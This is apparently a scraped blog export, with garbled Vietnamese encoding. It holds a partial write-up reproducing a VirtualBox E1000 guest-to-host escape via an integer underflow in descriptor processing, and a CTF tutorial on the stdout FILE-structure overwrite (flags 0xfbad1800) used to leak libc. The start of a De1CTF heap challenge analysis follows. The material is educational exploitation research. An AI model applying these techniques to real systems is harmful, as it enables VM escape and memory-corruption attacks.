pThis) { if (pThis-\u0026gt;nTxDFetched == 0) return e1kTxDLoadMore(pThis) != 0; return true; } Gi·∫£ s·ª≠ c√°c descriptor ·ªü tr√™n ƒë∆∞·ª£c ghi v√†o Tx Ring(l√† ngu·ªìn t·ª´ ph·∫ßn c·ª©ng th√¥ng qua h·ªá th·ªëng c√°i m√† ƒë∆∞·ª£c nh·∫≠n v√†o v√† g·ª≠i c√°c g√≥i tin t·ªõi m·∫°ng). H√†m e1kTxDLazyLoad() s·∫Ω ƒë∆∞·ª£c th·ª±c thi, l√∫c n√†y n√≥ s·∫Ω ƒë·ªçc 5 descriptor t·ª´ Tx Ring. T·∫°i l·∫ßn ƒë·∫ßu ti√™n g·ªçi t·ªõi h√†m e1kLocateTxPacket(), th√¨ h√†m n√†y s·∫Ω ƒëi qua 1 l∆∞·ª£t c√°c descriptor ƒë∆∞·ª£c kh·ªüi t·∫°o nh∆∞ng n√≥ kh√¥ng handle ch√∫ng, ·ªü l·∫ßn ƒë·∫ßu ti√™n th√¨ n√≥ ch·ªâ ƒë·ªçc 3 descriptor ƒë·∫ßu ([context_1, data_2, data_3]) v√† v√≤ng l·∫∑p th·ª© 2 n√≥ s·∫Ω ƒë·ªçc 2 descriptor c√≤n l·∫°i ([context_4, data_5]).\ne1kLocateTxPacket() static bool e1kLocateTxPacket(PE1KSTATE pThis) { ... for (int i = pThis-\u0026gt;iTxDCurrent; i \u0026lt; pThis-\u0026gt;nTxDFetched; ++i) { E1KTXDESC *pDesc = \u0026amp;pThis-\u0026gt;aTxDescriptors[i]; switch (e1kGetDescType(pDesc)) { case E1K_DTYP_CONTEXT: e1kUpdateTxContext(pThis, pDesc); continue; case E1K_DTYP_LEGACY: /* Skip empty descriptors. */ if (!pDesc-\u0026gt;legacy.u64BufAddr || !pDesc-\u0026gt;legacy.cmd.u16Length) break; cbPacket += pDesc-\u0026gt;legacy.cmd.u16Length; pThis-\u0026gt;fGSO = false; break; case E1K_DTYP_DATA: /* Skip empty descriptors. */ ... } } } Descriptor ƒë·∫ßu ti√™n ([context_1]) n√≥ s·∫Ω l√† case E1K_DTYP_CONTEXT th√¨ h√†m e1kUpdateTxContext() s·∫Ω ƒë∆∞·ª£c g·ªçi v√† c·∫≠p nh·∫≠t TCP Segmentation Context n·∫øu nh∆∞ TCP Segmentation ƒë∆∞·ª£c b·∫≠t cho descriptor ƒë√≥.\nDescriptor th·ª© hai ([data_2]) l√† case E1K_DTYP_DATA(), n√≥ kh√¥ng quan tr·ªçng trong b√†i vi·∫øt n√†y n√™n ko c·∫ßn nh·∫Øc t·ªõi.\nDescriptor th·ª© 3 ([data_3]) c≈©ng l√† case E1K_DTYP_DATA(), nh∆∞ng m√† do data_3.data_length = 0 v√¨ th·∫ø n√™n s·∫Ω kh√¥ng c√≥ chuy·ªán g√¨ x·∫£y ra\nSau khi th·ª±c hi·ªán xong h√†m switch case th√¨ s·∫Ω c√≥ m·ªôt h√†m check li·ªáu thu·ªôc t√≠nh end_of_packet c·ªßa descriptor ƒë√≥ c√≥ true hay kh√¥ng. T·∫°i v√¨ data_3.end_of_packet = true v·∫≠y n√™n s·∫Ω th·ª±c thi c√¢u l·ªánh b√™n trong h√†m if v√† return v·ªÅ true.\nif (pDesc-\u0026gt;legacy.cmd.fEOP) { ... return true; } N·∫øu nh∆∞ data_3.end_of_packet ƒë∆∞·ª£c set th√†nh false th√¨ 2 descriptor c√≤n l·∫°i [context_4, data_5] s·∫Ω ƒë∆∞·ª£c x·ª≠ l√Ω v√† l·ªó h·ªïng s·∫Ω ƒë∆∞·ª£c bypassed.\nB√™n trong v√≤ng l·∫∑p while true c·ªßa h√†m e1kXmitPending() c√≥ g·ªçi ƒë·∫øn h√†m e1kXmitPacket(), ·ªü h√†m n√†y n√≥ s·∫Ω x·ª≠ l√Ω to√†n b·ªô descriptor c·ªßa ch√∫ng ta (·ªü ƒë√¢y l√† 5)\nwhile (pThis-\u0026gt;iTxDCurrent \u0026lt; pThis-\u0026gt;nTxDFetched) { E1KTXDESC *pDesc = \u0026amp;pThis-\u0026gt;aTxDescriptors[pThis-\u0026gt;iTxDCurrent]; ... rc = e1kXmitDesc(pThis, pDesc, e1kDescAddr(TDBAH, TDBAL, TDH), fOnWorkerThread); ... if (e1kGetDescType(pDesc) != E1K_DTYP_CONTEXT \u0026amp;\u0026amp; pDesc-\u0026gt;legacy.cmd.fEOP) break; } ·ª®ng v·ªõi m·ªói descriptor th√¨ h√†m e1kXmitDesc() s·∫Ω ƒë∆∞·ª£c g·ªçi ƒë·ªÉ x·ª≠ l√Ω n√≥\nstatic int e1kXmitDesc(PE1KSTATE pThis, E1KTXDESC *pDesc, RTGCPHYS addr, bool fOnWorkerThread) { ... switch (e1kGetDescType(pDesc)) { case E1K_DTYP_CONTEXT: ... break; case E1K_DTYP_DATA: { ... if (pDesc-\u0026gt;data.cmd.u20DTALEN == 0 || pDesc-\u0026gt;data.u64BufAddr == 0) { E1kLog2((\u0026#34;% Empty data descriptor, skipped.\\n\u0026#34;, pThis-\u0026gt;szPrf)); } else { if (e1kXmitIsGsoBuf(pThis-\u0026gt;CTX_SUFF(pTxSg))) { ... } else if (!pDesc-\u0026gt;data.cmd.fTSE) { ... } else { STAM_COUNTER_INC(\u0026amp;pThis-\u0026gt;StatTxPathFallback); rc = e1kFallbackAddToFrame(pThis, pDesc, fOnWorkerThread); } } ... } } } L·∫ßn l∆∞·ª£t c√°c descriptor ƒë∆∞·ª£c ƒë∆∞a v√†o ƒë·ªÉ x·ª≠ l√Ω v√† th·ª±c thi c√°c h√†m b√™n trong case t∆∞∆°ng ·ª©ng c·ªßa n√≥\nV·ªõi descriptor ƒë·∫ßu ti√™n l√† context_1 th√¨ n√≥ s·∫Ω kh√¥ng l√†m g√¨ h·∫øt\nT·∫°i v√¨ tcp_segmentation_enable == true v·ªõi t·∫•t c·∫£ c√°c data transcriptor th√¨ c√¢u l·ªánh b√™n trong h√†m else c·ªßa c√¢u l·ªánh if (e1kXmitIsGsoBuf(pThis-\u0026gt;CTX_SUFF(pTxSg))) ƒë∆∞·ª£c g·ªçi t·ª©c l√† h√†m e1kFallbackAddToFrame() s·∫Ω ƒë∆∞·ª£c th·ª±c thi, tuy nhi√™n ·ªü b√™n trong h√†m e1kFallbackAddToFrame() c√≥ bug interger underflow l√∫c m√† data_5 ƒë∆∞·ª£c x·ª≠ l√Ω.\nstatic int e1kFallbackAddToFrame(PE1KSTATE pThis, E1KTXDESC *pDesc, bool fOnWorkerThread) { ... uint16_t u16MaxPktLen = pThis-\u0026gt;contextTSE.dw3.u8HDRLEN + pThis-\u0026gt;contextTSE.dw3.u16MSS; /* * Carve out segments. */ int rc = VINF_SUCCESS; do { /* Calculate how many bytes we have left in this TCP segment */ uint32_t cb = u16MaxPktLen - pThis-\u0026gt;u16TxPktLen; if (cb \u0026gt; pDesc-\u0026gt;data.cmd.u20DTALEN) { /* This descriptor fits completely into current segment */ cb = pDesc-\u0026gt;data.cmd.u20DTALEN; rc = e1kFallbackAddSegment(pThis, pDesc-\u0026gt;data.u64BufAddr, cb, pDesc-\u0026gt;data.cmd.fEOP /*fSend*/, fOnWorkerThread); } else { ... } pDesc-\u0026gt;data.u64BufAddr += cb; pDesc-\u0026gt;data.cmd.u20DTALEN -= cb; } while (pDesc-\u0026gt;data.cmd.u20DTALEN \u0026gt; 0 \u0026amp;\u0026amp; RT_SUCCESS(rc)); if (pDesc-\u0026gt;data.cmd.fEOP) { ... pThis-\u0026gt;u16TxPktLen = 0; ... } return VINF_SUCCESS; /// @todo consider rc; } ·ªû h√†m tr√™n c√≥ bi·∫øn uint16_t u16MaxPktLen, pThis-\u0026gt;u16TxPktLen v√† pDesc-\u0026gt;data.cmd.u20DTALEN l√† ƒë√°ng ƒë·ªÉ ch√∫ √Ω ƒë·∫øn.\nif (e1kGetDescType(pDesc) != E1K_DTYP_CONTEXT \u0026amp;\u0026amp; pDesc-\u0026gt;legacy.cmd.fEOP) break; ·ªû b√™n trong h√†m e1kXmitPacket() n√≥ c√≥ ƒë·ªÅ c·∫≠p ƒë·∫øn n·∫øu nh∆∞ descriptor ƒëang ƒë∆∞·ª£c x·ª≠ l√Ω l√† data v√† end_of_packet == true th√¨ n√≥ s·∫Ω tho√°t kh·ªèi v√≤ng l·∫∑p. Transcriptor data_3 c√≥ data_3.end_of_packet == true t·∫•t y·∫øu s·∫Ω h·ªßy v√≤ng l·∫∑p trong khi c√≤n 2 descriptor c√≤n l·∫°i l√† ch∆∞a ƒë∆∞·ª£c x·ª≠ l√Ω, t·∫°i sao ƒëi·ªÅu n√†y l·∫°i quan tr·ªçng, th√¨ t·∫•t c·∫£ c√°c context descriptor ƒë·ªÅu ƒë∆∞·ª£c ƒë·ªçc sau khi ƒë√£ x·ª≠ l√Ω xong data descriptor. Context descriptor ƒë∆∞·ª£c x·ª≠ l√Ω trong su·ªët qu√° tr√¨nh TCP Segmentation Context Update ·ªü trong h√†m e1kLocateTxPacket() v√† data descriptor ƒë∆∞·ª£c x·ª≠ l√Ω sau ƒë√≥ t·∫°i b√™n trong v√≤ng l·∫∑p c·ªßa h√†m e1kXmitPacket(). Ng∆∞·ªùi l·∫≠p tr√¨nh h∆∞·ªõng theo nh∆∞ v·∫≠y v·ªõi m·ª•c ƒë√≠ch ngƒÉn c·∫£n s·ª± thay ƒë·ªïi gi√° tr·ªã c·ªßa bi·∫øn u16MaxPktLen tr∆∞·ªõc khi m·ªôt s·ªë data ƒë∆∞·ª£c th·ª±c thi ƒë·ªÉ ngƒÉn c·∫£n bug interger underflow t·∫°i h√†m e1kFallbackAddToFrame():\nuint32_t cb = u16MaxPktLen - pThis-\u0026gt;u16TxPktLen Nh∆∞ng v·∫´n c√≥ c√°ch ƒë·ªÉ bypass c∆° ch·∫ø b·∫£o v·ªá n√†y\n","date":"28 November 2022","externalUrl":null,"permalink":"/posts/virtualbox_e1000_0day_reproduce/","section":"Posts","summary":"VirtualBox E1000 Guest-to-Host Escape. But it not done yet \u0026hellip;.","title":"Virtualbox e1000 0day Reproduce"},{"content":"","date":"16 September 2022","externalUrl":null,"permalink":"/tags/technique/","section":"Tags","summary":"","title":"Technique"},{"content":" üìù T·∫£n m·∫°n m·ªôt x√≠u v·ªÅ technique tr√™n? # Libc l√† g√¨ üöÄ # (n·∫øu nh∆∞ c√°c b·∫°n ƒë√£ bi·∫øt libc l√† g√¨ v√† bi·∫øt technique ret2libc th√¨ c√≥ th·ªÉ b·ªè qua ph·∫ßn n√†y) ƒê·ªëi v·ªõi m·ªôt s·ªë b·∫°n ch∆°i Pwnable n√≥i ri√™ng v√† c√°c b·∫°n ch∆°i CTF n√≥i chung th√¨ ƒë√£ √≠t nhi·ªÅu nghe ƒë·∫øn c·ª•m t·ª´ \u0026ldquo;Libc\u0026rdquo;. V·∫≠y libc l√† g√¨? \u0026quot;C·ª•m t·ª´ \u0026quot;libc\u0026quot; th∆∞·ªùng ƒë∆∞·ª£c d√πng nh∆∞ l√† m·ªôt t·ª´ vi·∫øt t·∫Øt cho \u0026quot;standard C library\u0026quot;, m·ªôt th∆∞ vi·ªán c√°c h√†m c√°i m√† c√≥ th·ªÉ d√πng b·ªüi t·∫•t c·∫£ C programs\u0026quot;\nV·∫≠y c√≥ nghƒ©a, ƒë·ªãa ch·ªâ g·ªëc c·ªßa libc r·∫•t l√† quan tr·ªçng, khi b·∫°n ƒë√£ c√≥ ƒë·ªãa ch·ªâ g·ªëc c·ªßa libc b·∫°n c√≥ th·ªÉ l√†m r·∫•t l√† nhi·ªÅu th·ª©, ƒëi·ªÉn h√¨nh nh·∫•t l√† b·∫°n c√≥ th·ªÉ d√πng one_gadget ƒë·ªÉ execve(\u0026rsquo;/bin/sh\u0026rsquo;,0,0) ho·∫∑c l√† g·ªçi system(\u0026rsquo;/bin/sh\u0026rsquo;),\u0026hellip;.. N√¥m na cu·ªëi c√πng libc d√πng ƒë·ªÉ pop a shell. ƒê·ªÉ c√≥ th·ªÉ ƒë·ªëi ph√≥ v·ªõi v·∫•n ƒë·ªÅ tr√™n, m·ªôt s·ªë challenge\u0026rsquo;s author s·∫Ω kh√¥ng cho b·∫•t c·ª© function(puts, printf,\u0026hellip;.) ƒë·ªÉ c√≥ th·ªÉ leak ra ƒë·ªãa ch·ªâ c·ªßa libc. How this technique works? üßê # M√¨nh kh√¥ng ch·∫Øc ai l√† ng∆∞·ªùi t·∫°o ra technique n√†y nh∆∞ng m√† l·∫ßn ƒë·∫ßu ti√™n m√¨nh th·∫•y n√≥ ƒë∆∞·ª£c √°p d·ª•ng v√†o trong ctf l√† v√†o gi·∫£i HITCON 2018 c√¢u babytcache c·ªßa angelboy.tw, sau ƒë√≥ anh ·∫•y c√≥ publish solution cho c√¢u n√†y t·∫°i ƒë√¢y: github.com/scwuaptx/CTF/blob/master/2018-writeup/hitcon/baby_tcache.py\nV·∫≠y n√™n technique n√†y yang h·ªì hay g·ªçi l√†: Angelboy\u0026rsquo;s leak Technique n√†y s·∫Ω gi·∫£i quy·∫øt v·∫•n ƒë·ªÅ thay ƒë·ªïi c·∫•u tr√∫c stdout c·ªßa IO_FILE ƒë·ªÉ c√≥ th·ªÉ bi·∫øn n√≥ th√†nh h√†m puts ƒë·ªÉ leak ƒë·ªãa ch·ªâ c·ªßa libc. N√≥ thay ƒë·ªïi c·∫•u tr√∫c c·ªßa stdout c·ªßa IO_FILE b·∫±ng c√°ch modify flag bit c·ªßa stdout th√†nh 0xfbad1800 v√† khi·∫øn cho byte cu·ªëi c·ªßa _IO_write_base nh·ªè l·∫°i. ·ªû b√™n d∆∞·ªõi m√¨nh s·∫Ω n√≥i t·∫°i sao modify flag bit c·ªßa stdout th√†nh 0xfbad1800.\nƒê·∫ßu ti√™n ta ph·∫£i hi·ªÉu h√†m puts ho·∫°t ƒë·ªông ra sao ü§® # M·ªôt c√°i v√≠ d·ª• c∆° b·∫£n v·ªÅ h√†m puts g·ªçi trong libc, th√¨ m√¨nh s·∫Ω d√πng m·ªôt ch∆∞∆°ng tr√¨nh in ra \u0026ldquo;Hello world\u0026rdquo;, m·ªôt ch∆∞∆°ng tr√¨nh t·ª´ thu·ªü s∆° khai ai c≈©ng ph·∫£i ti·∫øp x√∫c trong c√°i b·ªô m√¥n n√†y.\n#include \u0026lt;stdio.h\u0026gt; void main() { printf(\u0026#34;Hello World\\n); } ·ªû c√°c version sau n√†y c·ªßa libc th√¨ khi compile ·ªü assembly code th√¨ n√≥ s·∫Ω g·ªçi tr·ª±c ti·∫øp ƒë·∫øn h√†m printf lu√¥n nh∆∞ng m√† ·ªü c√°c libc c≈© th√¨ n√≥ s·∫Ω g·ªçi ƒë·∫øn h√†m puts nh∆∞ng m√† ƒëi·ªÅu ƒë√≥ v·∫´n kh√¥ng quan tr·ªçng cho l·∫Øm\n.file \u0026#34;hello.c\u0026#34; .section .rodata .LC0: .string \u0026#34;Hello World!\u0026#34; .text .globl main .type main, @function main: pushq %rbp movq %rsp, %rbp movl $.LC0, %edi call puts popq %rbp ret Ti·∫øp theo th√¨ ta s·∫Ω xem h√†m puts l√†m g√¨ ·ªü libc-2.31 (phi√™n b·∫£n m√† m√¨nh ƒëang s·ª≠ d·ª•ng hi·ªán t·∫°i) Th·ª±c t·∫ø th√¨ codebase c·ªßa glibc r·∫•t l√† r·ªông v√† c√°ch ho·∫°t ƒë·ªông c·ªßa n√≥ n·∫±m ·ªü ph·∫°m v·ªã vƒ© m√¥, v√¨ th·∫ø n√™n r·∫•t kh√≥ ƒë·ªÉ c√≥ th·ªÉ ƒë·ªãnh h∆∞·ªõng ƒë∆∞·ª£c m·ª•c ti√™u m√† m√¨nh c·∫ßn. Khi nh√¨n v√†o codebase ta c√≥ th·ªÉ th·∫•y weak_alias (_IO_puts, puts) ·ªü trong file libio/ioputs.c. ·ªû trong glibc, ƒëi·ªÅu n√†y c√≥ nghƒ©a l√† b·∫•t k·ª≥ ai khi g·ªçi h√†m puts th√¨ th·ª±c t·∫ø thay v√†o ƒë√≥ s·∫Ω g·ªçi IO_puts H√†m IO_puts nh∆∞ sau\nint _IO_puts (const char *str) { int result = EOF; size_t len = strlen (str); _IO_acquire_lock (_IO_stdout); if ((_IO_vtable_offset (_IO_stdout) != 0 || _IO_fwide (_IO_stdout, -1) == -1) \u0026amp;\u0026amp; _IO_sputn (_IO_stdout, str, len) == len \u0026amp;\u0026amp; _IO_putc_unlocked (\u0026#39;\\n\u0026#39;, _IO_stdout) != EOF) result = MIN (INT_MAX, len + 1); _IO_release_lock (_IO_stdout); return result; } M·ªõ ·ªü tr√™n ch√∫ng ta kh√¥ng c·∫ßn ph·∫£i ƒë·ªÉ √Ω t·∫•t c·∫£ m√† ch·ªâ c·∫ßn focus v√¥ h√†m IO_sputn. H√†m IO_sputn ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a t·∫°i libio/libioP.h, line 374 (as a macro) ƒê√†o s√¢u v√†o trong ta th·∫•y n√≥ l√† 1 n√πi c√°c macro nh√¨n m√† kh√¥ng th·∫•y ƒë∆∞·ªùng ra Sau m·ªôt h·ªìi m·∫Øt m√¨nh ƒë·∫£o nh∆∞ rang l·∫°c th√¨ m√¨nh ƒë√£ t√¨m ra ƒë∆∞·ª£c m·ªôt c√°i function li√™n quan ƒë·∫øn v·∫•n ƒë·ªÅ m√† ch√∫ng ta ƒëang ƒë·ªÅ c·∫≠p, ƒë√≥ ch√≠nh l√† _IO_new_file_xsputn ƒë∆∞·ª£c m√¥ t·∫£ t·∫°i libio/libioP.h, line 596 (as a prototype) Sau m·ªôt th·ªùi gian m√≤ m·∫´m code c·ªßa h√†m _IO_new_file_xsputn th√¨ cu·ªëi c√πng n√≥ c≈©ng ƒë√£ d·ª´ng l·∫°i t·∫°i h√†m _IO_OVERFLOW ƒë∆∞·ª£c defined t·∫°i libio/libioP.h, line 141 (as a macro) (L√†m c√°i m·ªõ n√†y m√¨nh c≈©ng ƒëang kh√¥ng bi·∫øt ƒëang l√†m mics hay l√†m pwn n·ªØa \u0026hellip; üòï) V√† cu·ªëi c√πng th√¨ ƒë√¢y ch√≠nh l√† c√°i m√† ch√∫ng ta ƒëang c·∫ßn t√¨m:\nint _IO_new_file_overflow (FILE *f, int ch) { if (f-\u0026gt;_flags \u0026amp; _IO_NO_WRITES) /* SET ERROR */ { f-\u0026gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; } /* If currently reading or no buffer allocated. */ if ((f-\u0026gt;_flags \u0026amp; _IO_CURRENTLY_PUTTING) == 0 || f-\u0026gt;_IO_write_base == NULL) { /* Allocate a buffer if needed. */ if (f-\u0026gt;_IO_write_base == NULL) { _IO_doallocbuf (f); _IO_setg (f, f-\u0026gt;_IO_buf_base, f-\u0026gt;_IO_buf_base, f-\u0026gt;_IO_buf_base); } if (__glibc_unlikely (_IO_in_backup (f))) { size_t nbackup = f-\u0026gt;_IO_read_end - f-\u0026gt;_IO_read_ptr; _IO_free_backup_area (f); f-\u0026gt;_IO_read_base -= MIN (nbackup, f-\u0026gt;_IO_read_base - f-\u0026gt;_IO_buf_base); f-\u0026gt;_IO_read_ptr = f-\u0026gt;_IO_read_base; } if (f-\u0026gt;_IO_read_ptr == f-\u0026gt;_IO_buf_end) f-\u0026gt;_IO_read_end = f-\u0026gt;_IO_read_ptr = f-\u0026gt;_IO_buf_base; f-\u0026gt;_IO_write_ptr = f-\u0026gt;_IO_read_ptr; f-\u0026gt;_IO_write_base = f-\u0026gt;_IO_write_ptr; f-\u0026gt;_IO_write_end = f-\u0026gt;_IO_buf_end; f-\u0026gt;_IO_read_base = f-\u0026gt;_IO_read_ptr = f-\u0026gt;_IO_read_end; f-\u0026gt;_flags |= _IO_CURRENTLY_PUTTING; if (f-\u0026gt;_mode \u0026lt;= 0 \u0026amp;\u0026amp; f-\u0026gt;_flags \u0026amp; (_IO_LINE_BUF | _IO_UNBUFFERED)) f-\u0026gt;_IO_write_end = f-\u0026gt;_IO_write_ptr; } if (ch == EOF) return _IO_do_write (f, f-\u0026gt;_IO_write_base, f-\u0026gt;_IO_write_ptr - f-\u0026gt;_IO_write_base); if (f-\u0026gt;_IO_write_ptr == f-\u0026gt;_IO_buf_end ) /* Buffer is really full */ if (_IO_do_flush (f) == EOF) return EOF; *f-\u0026gt;_IO_write_ptr++ = ch; if ((f-\u0026gt;_flags \u0026amp; _IO_UNBUFFERED) || ((f-\u0026gt;_flags \u0026amp; _IO_LINE_BUF) \u0026amp;\u0026amp; ch == \u0026#39;\\n\u0026#39;)) if (_IO_do_write (f, f-\u0026gt;_IO_write_base, f-\u0026gt;_IO_write_ptr - f-\u0026gt;_IO_write_base) == EOF) return EOF; return (unsigned char) ch; } ƒê·ªÉ c√≥ th·ªÉ gi·∫£i th√≠ch c√°i h√†m tr√™n th√¨ ch·∫Øc ƒë·∫øn m√πa qu√Ωt m√¨nh m·ªõi gi·∫£i quy·∫øt ƒë∆∞·ª£c v·∫•n ƒë·ªÅ n√†y m·∫•t, ch√∫ng ta h√£y focus v√†o h√†m _IO_do_write th√¨ n√≥ ch√≠nh l√† h√†m cu·ªëi c√πng ƒë∆∞·ª£c g·ªçi v√† _IO_write_base ch√≠nh l√† tham s·ªë cu·ªëi c√πng m√† ch√∫ng ta c·∫ßn modify. ƒê·ªÉ c√≥ th·ªÉ ch·∫°m ƒë∆∞·ª£c ƒë·∫øn h√†m if cu·ªëi c√πng th√¨ ch√∫ng ta c·∫ßn ph·∫£i bypass t·∫•t c·∫£ h√†m if ·ªü tr√™n, ch√∫ng ta kh√¥ng mu·ªën ph·∫£i v∆∞·ªõng v√†o m·ªôt trong c√°c nh√°nh c·ªßa h√†m if ƒë√≥ ƒë√¢u. Quay v·ªÅ b√™n tr√™n c√πng, ch√∫ng ta s·∫Ω bypass t·ª´ng h√†m if m·ªôt.\n·ªû h√†m if ƒë·∫ßu ti√™n c√°i gi√° tr·ªã f-\u0026gt;flag \u0026amp; _IO_NO_WRITES ph·∫£i l√† 0, ƒë·ªÉ kh√¥ng d√≠nh v√†o b√™n trong h√†m if. Ti·∫øp theo ch√∫ng ta ph·∫£i set f-\u0026gt;flag \u0026amp; _IO_CURRENTLY_PUTTING b·∫±ng 1 ƒë·ªÉ kh√¥ng v√†o b√™n trong h√†m if th·ª© 2 ƒê√†o s√¢u m·ªôt t√≠ v√†o h√†m _IO_do_write th√¨ ta s·∫Ω th·∫•y m·ªôt h√†m n·ªØa ch·∫°y c√πng v·ªõi h√†m tr√™n ƒë√≥ l√† _IO_new_do_write static size_t new_do_write (FILE *fp, const char *data, size_t to_do) { size_t count; if (fp-\u0026gt;_flags \u0026amp; _IO_IS_APPENDING) fp-\u0026gt;_offset = _IO_pos_BAD; else if (fp-\u0026gt;_IO_read_end != fp-\u0026gt;_IO_write_base) { off64_t new_pos = _IO_SYSSEEK (fp, fp-\u0026gt;_IO_write_base - fp-\u0026gt;_IO_read_end, 1); if (new_pos == _IO_pos_BAD) return 0; fp-\u0026gt;_offset = new_pos; } count = _IO_SYSWRITE (fp, data, to_do); //our aim ... return count; } V√† ƒë√¢y ch√≠nh l√† m·ª•c ti√™u cu·ªëi c√πng c·ªßa ch√∫ng ta (ho·∫∑c th·ª© g√¨ ƒë√≥ x√™m x√™m) _IO_SYSWRITE (fp, data, to_do) Sau khi l∆∞·ª£c qua c√°c h√†m if th√¨ ƒë·ªÉ c√≥ th·ªÉ bypass t·∫•t c·∫£ c√°c h√†m if tr√™n l√† b·∫•t kh·∫£ thi(nhi·ªÅu l√≠ do kh√≥ c√≥ th·ªÉ m√† khai th√°c ƒë∆∞·ª£c, c√≥ m·ªôt c√°i v·∫•n ƒë·ªÅ m√† ch√∫ng ta kh√¥ng th·ªÉ control n√≥ ƒë∆∞·ª£c ƒë√≥ l√† fp-\u0026gt;_IO_write_base - fp-\u0026gt;_IO_read_end. N·∫øu nh∆∞ ch√∫ng ta set fp-\u0026gt;_IO_read_end th√†nh 0, d·∫´n t·ªõi h·∫≠u qu·∫£ l√† tham s·ªë th·ª© 2 s·∫Ω qu√° d√†i, v√† n·∫øu ta set fp-\u0026gt;_IO_write_base \u0026gt; fp-\u0026gt;_IO_read_end th√¨ ch√∫ng ta s·∫Ω d√≠nh l·ªói ·ªü 1 ch·ªó kh√°c, t·∫°i v√¨ _IO_write_base s·∫Ω tr·ªü n√™n l·ªõn h∆°n _IO_write_ptr m√† c√°i ta c·∫ßn l√† _IO_write_base ph·∫£i nh·ªè h∆°n _IO_write_ptr), d∆∞·ªùng nh∆∞ ch√∫ng ta ch·ªâ c√≥ l·ª±a ch·ªçn skip qua h√†m else if, ƒë·ªÉ hi·ªán th·ª±c h√≥a ƒëi·ªÅu n√†y th√¨ ta c·∫ßn focus v√†ofp-\u0026gt;_IO_write_base v√† fp-\u0026gt;_IO_read_end, d·ª±a v√†o source code tr√™n th√¨ ta c√≥ th·ªÉ suy ra ƒë∆∞·ª£c ƒë√≥ l√† ta ph·∫£i set fp-\u0026gt;flags \u0026amp; _IO_is_appending\nInconclusion # _IO_file ƒë∆∞·ª£c bao g·ªìm trong _IO_FILE_plus c√≥ c·∫•u tr√∫c nh∆∞ b√™n d∆∞·ªõi:\nstruct _IO_FILE_plus { _IO_FILE file; const struct _IO_jump_t *vtable; }; _IO_FILE ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a d∆∞·ªõi d·∫°ng linked list, ƒë·∫ßu node c·ªßa list tr√™n l√† _IO_list_all. T√≥m t·∫Øt s∆° qua th√¨ IO_list_all s·∫Ω tr·ªè ƒë·∫øn stderr (file descriptor l√† 2) ti·∫øp theo s·∫Ω tr·ªè ƒë·∫øn stdout(file descriptor l√† 1) v√† cu·ªëi c√πng tr·ªè ƒë·∫øn stdin(file descriptor l√† 0). D∆∞·ªõi ƒë√¢y l√† nh·ªØng gi√° tr·ªã c·∫ßn thi·∫øt cho vi·ªác bypass to√†n b·ªô nh·ªØng h√†m if ·ªü b√™n tr√™n v√† ƒë·∫°t ƒë·∫øn m·ª•c ti√™u cu·ªëi c√πng.\n_flags = 0xfbad0000 //magic number _flags \u0026amp;= _IO_NO_WRITE //flag = 0xfbad0000 _flag |= _IO_CURRENTLY_PUTTING //flag = 0xfbad0800 _flag |= _IO_IS_APPENDING //flag = 0xfbad1800 V·∫≠y t·∫•t c·∫£ nh·ªØng g√¨ ch√∫ng ta c·∫ßn l√†m ƒë√≥ ch√≠nh l√† set stdout-\u0026gt;flags th√†nh 0xfbad1800 v√† ƒë·ªÉ leak m√† th·ª© ch√∫ng ta c·∫ßn th√¨ ch√∫ng ta ph·∫£i t√≠nh to√°n offset c·ª• th·ªÉ ƒë·ªÉ c√≥ th·ªÉ ghi ƒë√®, c·ª• th·ªÉ ·ªü ƒë√¢y ƒë√≥ ch√≠nh l√† c√°i ch·ª©c nƒÉng m√† ta output v√≠ d·ª• nh∆∞ l√† puts ch·∫≥ng h·∫°n ph·∫£i d·ª±a v√†o k·∫øt qu·∫£ c·ªßa IO_write_ptr - IO_write_base\nTrƒÉm nghe th√¨ kh√¥ng b·∫±ng m·ªôt th·∫•y, ·ªü d∆∞·ªõi m√¨nh demo technique tr√™n b·∫±ng c√¢u weapon c·ªßa gi·∫£i De1CTF\nWeapon # Analyze # Nh∆∞ m·ªôt th√≥i quen th√¨ m·ªçi challenge pwn th√¨ m√¨nh s·∫Ω lu√¥n check file, checksec, check c√°c l·ªói c∆° b·∫£n, v\u0026hellip;v.. Nh√¨n v√†o th√¨ ƒë·ªÅ b√†i cho m·ªôt file ELF 64-bit, b·ªã stripped v√† full mitigation (full ƒë·ªì full gi√°p \u0026hellip;.) \u0026ldquo;L√† m·ªôt th·∫±ng ƒë√†n √¥ng th√¨ kh√¥ng ch√πn b∆∞·ªõc tr∆∞·ªõc m·ªçi th·ª≠ th√°ch\u0026rdquo;\nƒê·ªÅ cho ta 1 v√≤ng l·∫∑p, trong ƒë√≥ c√≥ 3 function c∆° b·∫£n c·ªßa 1 b√†i heap: Create, delete v√† kh√¥ng ƒë∆∞·ª£c cung c·∫•p h√†m in ƒë·ªÉ tr√°nh leak libc address ho·∫∑c nh·ªØng address quan tr·ªçng, b√π l·∫°i ta ƒë∆∞·ª£c h√†m rename m·ªôt weapon(ch·∫Øc ch·∫Øn s·∫Ω c√≥ √≠ch trong l∆∞∆°ng lai)\nH√†m Create: ƒê∆°n gi·∫£n ch·ªâ l√† nh·∫≠p size c·ªßa m·ªôt chunk, index v√† data c·ªßa chunk ƒë√≥ th√¥ng qua bi·∫øn name. H√†m Delete: T∆∞∆°ng t·ª± nh∆∞ m·ªçi ƒë·ªÅ heap kh√°c, ch·ªâ ƒë·ªãnh free m·ªôt chunk ƒë√£ c√≥ s·∫µn th√¥ng qua bi·∫øn index H√†m rename: Thay ƒë·ªïi n·ªôi dung c·ªßa m·ªôt chunk ch·ªâ ƒë·ªãnh th√¥ng qua bi·∫øn index. Nh√¨n k·ªπ h∆°n b·∫±ng ida(m√¨nh ƒë√£ thay ƒë·ªïi t√™n bi·∫øn v√† m·ªôt s·ªë t√™n h√†m ƒë·ªÉ nh√¨n hi·ªÉu r√µ h∆°n)\nH√†m main nh∆∞ m√¨nh ƒë√£ n√≥i ·ªü tr√™n ‚¨ÜÔ∏è H√†m Create: B√†i n√†y ch·ªâ gi·ªõi h·∫°n size c·ªßa m·ªôt chunk trong kho·∫£ng 0 ƒë·∫øn 96, v√¨ libc b√†i n√†y cho ch·ªâ l√† phi√™n b·∫£n libc-2.23 v·∫≠y n√™n s·∫Ω kh√¥ng c√≥ tcache m√† b√†i n√†y ch·ªâ g√≥i g·ªçn trong fastbin, tuy b·ªã gi·ªõi h·∫°n trong fastbin nh∆∞ng d∆∞·ªùng nh∆∞ 